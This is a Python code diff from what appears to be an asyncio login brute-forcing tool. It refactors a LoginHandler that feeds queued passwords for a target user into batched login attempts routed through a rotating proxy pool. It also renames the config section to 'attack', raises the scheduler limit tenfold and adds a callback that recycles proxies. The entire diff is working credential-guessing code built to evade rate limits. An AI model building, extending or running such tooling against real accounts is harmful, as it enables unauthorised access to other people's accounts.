@@ -46,7 +46,7 @@ To remedy:
 
 class Handler(LoggerMixin):
 
-    SCHEDULER_LIMIT = 100
+    SCHEDULER_LIMIT = 1000
 
     def __init__(self, config, user=None, start_event=None, stop_event=None):
 
@@ -121,12 +121,11 @@ class ProxyHandler(Handler):
         log = self.create_logger('start', ignore_config=True)
         await log.start(f'Starting {self.__name__}')
 
-        if self.config['proxies']['prepopulate']:
-            try:
-                await log.debug('Prepopulating Proxy Pool...')
-                await self.pool.prepopulate(loop)
-            except Exception as e:
-                raise e
+        try:
+            await log.debug('Prepopulating Proxy Pool...')
+            await self.pool.prepopulate(loop)
+        except Exception as e:
+            raise e
 
         if self.config['proxies']['collect']:
             # Pool will set start event when it starts collecting proxies.
@@ -154,7 +153,7 @@ class LoginHandler(Handler):
         self._scheduler = None
 
         self.passwords = asyncio.Queue()
-
+        self.lock = asyncio.Lock()
         self.num_completed = 0
         self.num_passwords = 0  # Index for the current password and attempts per password.
 
@@ -195,15 +194,15 @@ class LoginHandler(Handler):
         return aiohttp.TCPConnector(
             ssl=False,
             force_close=True,
-            limit=self.config['login']['connection']['limit'],
-            limit_per_host=self.config['login']['connection']['limit_per_host'],
+            limit=self.config['attack']['connection']['limit'],
+            limit_per_host=self.config['attack']['connection']['limit_per_host'],
             enable_cleanup_closed=True,
         )
 
     @property
     def timeout(self):
         return aiohttp.ClientTimeout(
-            total=self.config['login']['connection']['timeout']
+            total=self.config['attack']['connection']['timeout']
         )
 
     @property
@@ -225,6 +224,12 @@ class LoginHandler(Handler):
 
         return self._cookies
 
+    async def proxy_callback(self, proxy):
+        loop = asyncio.get_event_loop()
+        loop.call_soon(asyncio.create_task(self.proxy_handler.pool.check_and_put(proxy)))
+        #loop.call_soon(asyncio.create_task(proxy.save()))
+        await self.schedule_task(proxy.save())
+
     async def login_task_generator(self, loop, session):
         """
         Generates coroutines for each password to be attempted and yields
@@ -239,16 +244,17 @@ class LoginHandler(Handler):
         while not self.passwords.empty():
             password = await self.passwords.get()
             if password:
-                scheduler = await self.scheduler()
                 yield attempt(
                     loop,
-                    session,
-                    self.user,
-                    self.token,
-                    password,
-                    proxy_pool=self.proxy_handler.pool,
-                    scheduler=scheduler,
-                    batch_size=self.config['login']['attempts']['batch_size'],
+                    {
+                        'session': session,
+                        'user': self.user,
+                        'token': self.token,
+                        'password': password
+                    },
+                    pool=self.proxy_handler.pool,
+                    batch_size=self.config['attack']['attempts']['batch_size'],
+                    proxy_callback=self.proxy_callback,
                 )
 
         await log.debug('Passwords Queue is Empty')
@@ -276,7 +282,7 @@ class LoginHandler(Handler):
         ) as session:
             gen = self.login_task_generator(loop, session)
             async for result, num_tries, current_tasks in limit_as_completed(
-                gen, self.config['login']['batch_size'], self.stop_event,
+                gen, self.config['attack']['batch_size'], self.stop_event,
             ):
                 # Generator Does Not Yield None on No More Coroutines
                 if result.conclusive:
